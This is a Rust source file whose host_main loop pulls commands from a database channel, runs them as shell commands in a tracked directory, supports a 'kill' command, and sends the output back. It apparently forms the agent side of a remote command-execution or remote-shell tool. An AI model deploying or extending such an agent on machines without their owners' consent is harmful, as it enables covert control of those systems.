use std::{thread, time};

use crate::command::exc;
use crate::db::get_command_thread::{check_command, get_command};
use crate::db::send;
use crate::ram_var::HostData;

pub fn host_main() {
    loop {
        reset();
        let mut data = get_command();
        if data.contains("dir") {
            HostData::get().location =  data.clone();
            data = "ls".to_owned()
        }
        let thread_worker = thread::spawn(move || {
            let dir = HostData::get().location.clone();
            let result = exc(data, dir);
            let mut pub_data = HostData::get();
            pub_data.data = result;
        });
        let result: String = loop {
            let pub_data = HostData::get();
            if thread_worker.is_finished() {
                break pub_data.data.clone();
            }
            drop(pub_data);
            if let Some(kill) = check_command() {
                if kill == *"kill" {
                    break "killed".to_owned();
                }
            }
        };
        send(&format!("**{}", result)).unwrap();
        thread::sleep(time::Duration::from_secs(1));
    }
}

fn reset() {
    let mut data = HostData::get();
    data.data = String::new();
}
